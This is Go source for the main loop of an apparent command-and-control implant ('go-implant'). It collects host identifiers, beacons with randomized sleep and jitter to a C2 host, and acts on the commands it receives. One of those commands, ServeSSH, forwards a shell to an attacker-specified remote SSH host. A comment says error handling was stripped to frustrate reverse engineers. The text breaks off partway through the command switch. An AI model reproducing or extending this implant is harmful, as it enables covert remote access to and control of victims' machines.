
/*
 *  and Fatalf's should be replaced with just os.exits - naw just remove them to keep reversers busy
 */

package main

import (
	"go-implant/client/beaconing"
	"go-implant/client/config"
	"go-implant/client/ssh"
	"go-implant/common/communication"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	"github.com/denisbrodbeck/machineid"
)

var taskchannels = []chan struct{}{} // channels for ssh tasks

func main() {

	runtime.GOMAXPROCS(runtime.NumCPU()) // use all logical cores available
	rand.Seed(time.Now().Unix())         // initialize global pseudo random generator
	initVars()                           // init values that get sent in beacon (UID, hostname, currentuser, os info)

	retries := 0

	// loop forever
	for {

		// check if there has been too many retries
		if (config.Retries == 0 && retries > 0) || (config.Retries > 0 && retries >= config.Retries) {
			if config.DEBUG {
				log.Println("Retries exceeded, exiting")
			}
			return
		}

		// choose an endpoint randomly
		endpoint := config.CCHost + config.Endpoints[rand.Intn(len(config.Endpoints))]

		// sleep random time [sleeptime - jitter, sleeptime + jitter]
		sleeptime := rand.Intn((config.Sleeptime+config.Jitter)-(config.Sleeptime-config.Jitter)) + config.Sleeptime - config.Jitter
		if config.DEBUG {
			log.Printf("Sleeping %d seconds", sleeptime)
		}
		time.Sleep(time.Duration(sleeptime) * time.Second)

		// Beacon
		msg, err := beaconing.DoBeacon(endpoint)
		if err != nil {
			if config.DEBUG {
				log.Printf("Error beaconing (%s)", err)
			}
			retries++
			continue
		}

		// parse received message
		var beaconresponse communication.BeaconResponse
		err = json.Unmarshal(msg, &beaconresponse)

		if err != nil {
			if config.DEBUG {
				log.Printf("Error parsing response (%s)", err)
			}
			continue
		}

		// iterate through all received commands
		for i := 0; i < len(beaconresponse.Commands); i++ {

			switch beaconresponse.Commands[i].Command {
			case communication.ServeSSH:
				// start serving ssh

				if config.DEBUG {
					log.Println("startSSH")
				}

				if len(beaconresponse.Commands[i].Args) != 8 {
					// incorrect amount of args
					if config.DEBUG {
						log.Println("Got incorrect amount of arguments!")
					}
					continue
				}

				localsshport, err := strconv.Atoi(beaconresponse.Commands[i].Args[0])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting localsshport to int (%s)", err)
					}
					continue
				}

				localsshusername := beaconresponse.Commands[i].Args[1]
				localsshpassword := beaconresponse.Commands[i].Args[2]
				remotesshusername := beaconresponse.Commands[i].Args[3]
				remotesshpassword := beaconresponse.Commands[i].Args[4]
				remotesshHost := beaconresponse.Commands[i].Args[5]

				remotesshPort, err := strconv.Atoi(beaconresponse.Commands[i].Args[6])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting remotesshPort to int (%s)", err)
					}
					continue
				}

				fromPort, err := strconv.Atoi(beaconresponse.Commands[i].Args[7])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting fromPort to int (%s)", err)
					}
					continue
				}

				newchan := make(chan struct{})
				taskchannels = append(taskchannels, newchan) // add new channel to the array
				go ssh.ForwardShell(newchan, localsshport, localsshusername, localsshpassword, remotesshusername, remotesshpassword, remotesshHost, remotesshPort, fromPort)

			case communication.StopSSH:
				// stop all sshs
				if config.DEBUG {
					log.Println("stopSSH")
				}
				stoptasks()

			case communication.SetSleeptime:
				// change sleeptime
